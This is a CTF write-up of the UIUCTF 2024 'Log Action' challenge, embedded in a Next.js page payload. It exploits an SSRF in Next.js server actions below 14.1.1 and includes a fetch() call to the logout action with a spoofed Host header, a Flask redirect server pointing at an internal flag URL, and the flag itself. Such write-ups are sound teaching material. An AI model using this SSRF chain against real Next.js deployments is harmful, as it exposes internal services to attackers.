@@ -1,0 +1,75 @@
+1:"$Sreact.fragment"
+2:I[87555,[],""]
+3:I[31295,[],""]
+4:I[6874,["874","static/chunks/874-c62c375efd21db20.js","319","static/chunks/app/writeups/layout-6eb8da7f54d57912.js"],""]
+6:I[59665,[],"MetadataBoundary"]
+8:I[59665,[],"OutletBoundary"]
+b:I[74911,[],"AsyncMetadataOutlet"]
+d:I[59665,[],"ViewportBoundary"]
+f:I[26614,[],""]
+:HL["/_next/static/media/a34f9d1faa5f3315-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/css/f67679a4dcf042a1.css","style"]
+0:{"P":null,"b":"LXc6w6ftcfUymS_FwiDab","p":"","c":["","writeups","6f7ef0a073b142a9ed5d460a930a9d1c"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","6f7ef0a073b142a9ed5d460a930a9d1c","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/f67679a4dcf042a1.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":[["$","$L4",null,{"href":"/","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to home"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}]]}],{"children":[["id","6f7ef0a073b142a9ed5d460a930a9d1c","d"],["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",["$","$L6",null,{"children":"$L7"}],null,["$","$L8",null,{"children":["$L9","$La",["$","$Lb",null,{"promise":"$@c"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","Gh_CBjpM8wZhXOvwWInCw",{"children":[["$","$Ld",null,{"children":"$Le"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$f","$undefined"],"s":false,"S":true}
+10:"$Sreact.suspense"
+11:I[74911,[],"AsyncMetadata"]
+7:["$","$10",null,{"fallback":null,"children":["$","$L11",null,{"promise":"$@12"}]}]
+a:null
+e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
+9:null
+12:{"metadata":[["$","title","0",{"children":"kevin.fish"}]],"error":null,"digest":"$undefined"}
+c:{"metadata":"$12:metadata","error":null,"digest":"$undefined"}
+13:I[50674,["325","static/chunks/325-8cc74193b249521f.js","134","static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js"],"default"]
+14:T588,"use client";
+import { useFormStatus, useFormState } from "react-dom";
+import { authenticate } from "@/lib/actions";
+
+export default function LoginPage() {
+  const [state, formAction] = useFormState(
+    authenticate,
+    undefined
+  );
+
+  const { pending } = useFormStatus();
+
+  return (
+    <>
+      <div className="max-w-prose mx-auto flex flex-col gap-4">
+        <p className="text-2xl font-bold">
+          Login
+        </p>
+        <form action={formAction} className="flex flex-col gap-4">
+          <label className="flex flex-col gap-1">
+            <span>Username</span>
+            <input
+              type="username"
+              id="username"
+              name="username"
+              placeholder="Enter your username"
+              required
+              minLength={3}
+            />
+          </label>
+          <label className="flex flex-col gap-1">
+            <span>Password</span>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Enter your password"
+              required
+              minLength={10}
+            />
+          </label>
+          <button type="submit" disabled={pending}>
+            Log in
+          </button>
+          {state ? (
+            <span className="text-sm text-red-500">
+              {state}
+            </span>
+          ) : null}
+        </form>
+      </div>
+    </>
+  )
+}5:["$","div",null,{"children":["$","main",null,{"className":"text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-3 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&>p>code]:bg-black/20 [&>p>code]:text-secondary [&>p>code]:px-2 [&>p>code]:py-1 [&>p>code]:rounded","children":[["$","h1","h1-0",{"children":"UIUCTF 2024 — Log Action"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I keep trying to log in, but it's not working :'("}],"\n",["$","p","p-1",{"children":"http://log-action.challenge.uiuc.tf/"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a simple Next.js + Next Auth site with a simple login / logout implementation:"}],"\n",["$","$L13","pre-0",{"className":"my-4","children":"$14","language":"tsx"}],"\n",["$","p","p-1",{"children":["The main idea here comes from the ",["$","a","a-0",{"href":"https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps","children":"SSRF in server actions section of this blog"}],"."]}],"\n",["$","p","p-2",{"children":["Essentially, for Next.js < 14.1.1, calls to ",["$","code","code-0",{"children":"redirect()"}]," in server actions that use a relative path (ex. ",["$","code","code-1",{"children":"/path"}],") will use the request's ",["$","code","code-2",{"children":"Host"}]," header to construct the absolute URL to redirect to. It then fetches this URL on the server to deliver to the client, resulting in SSRF."]}],"\n",["$","p","p-3",{"children":"Luckily, the challenge is running Next.js 14.1.0 and is therefore vulnerable to this attack!"}],"\n",["$","$L13","pre-1",{"className":"my-4","children":"    \"next\": \"14.1.0\",","language":"json"}],"\n",["$","p","p-4",{"children":["First, we need to find a server action to call that always results in a redirect. Looking in ",["$","code","code-0",{"children":"/logout/page.tsx"}],","]}],"\n",["$","$L13","pre-2",{"className":"my-4","children":"import Link from \"next/link\";\nimport { redirect } from \"next/navigation\";\nimport { signOut } from \"@/auth\";\n\nexport default function Page() {\n  return (\n    <>\n      <h1 className=\"text-2xl font-bold\">Log out</h1>\n      <p>Are you sure you want to log out?</p>\n      <Link href=\"/admin\">\n        Go back\n      </Link>\n      <form\n        action={async () => {\n          \"use server\";\n          await signOut({ redirect: false });\n          redirect(\"/login\");\n        }}\n      >\n        <button type=\"submit\">Log out</button>\n      </form>\n    </>\n  )\n}","language":"tsx"}],"\n",["$","p","p-5",{"children":"it looks like we can trigger this inline server action to do just that. We can manually call this action via"}],"\n",["$","$L13","pre-3",{"className":"my-4","children":"const formData = new FormData();\nformData.set('1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de', '');\nformData.set('0', '[\"$K1\"]');\n\nawait (await fetch('http://log-action.challenge.uiuc.tf/logout', {\n    method: 'POST',\n    headers: {\n        'Next-Action': 'c3a144622dd5b5046f1ccb6007fea3f3710057de',\n        // 'Host': '...'\n    },\n    body: formData\n})).text()","language":"js"}],"\n",["$","p","p-6",{"children":["editing the ",["$","code","code-0",{"children":"Host"}]," header to the URL of our exploit server. We can look in the docker-compose file to find that the flag is statically hosted by ",["$","code","code-1",{"children":"nginx"}]," at ",["$","code","code-2",{"children":"http://backend/flag.txt"}],":"]}],"\n",["$","$L13","pre-4",{"className":"my-4","children":"version: '3'\nservices:\n  frontend:\n    build: ./frontend\n    restart: always\n    environment:\n      - AUTH_TRUST_HOST=http://localhost:3000\n    ports:\n      - \"3000:3000\"\n    depends_on:\n      - backend\n  backend:\n    image: nginx:latest\n    restart: always\n    volumes:\n      - ./backend/flag.txt:/usr/share/nginx/html/flag.txt","language":"yml"}],"\n",["$","p","p-7",{"children":["Then, we can set up a Flask server to redirect our ",["$","code","code-0",{"children":"redirect()"}]," call to that URL and invoke the logout action to get the flag."]}],"\n",["$","$L13","pre-5",{"className":"my-4","children":"from flask import Flask, Response, request, redirect\napp = Flask(__name__)\n\n\n@app.route('/', defaults={'path': ''})\n@app.route('/<path:path>')\ndef catch(path):\n    if request.method == 'HEAD':\n        resp = Response(\"\")\n        resp.headers['Content-Type'] = 'text/x-component'\n        return resp\n    return redirect('http://backend/flag.txt')","language":"py"}],"\n",["$","$L13","pre-6",{"className":"my-4","children":"uiuctf{close_enough_nextjs_server_actions_welcome_back_php}","language":"$undefined"}]]}]}]
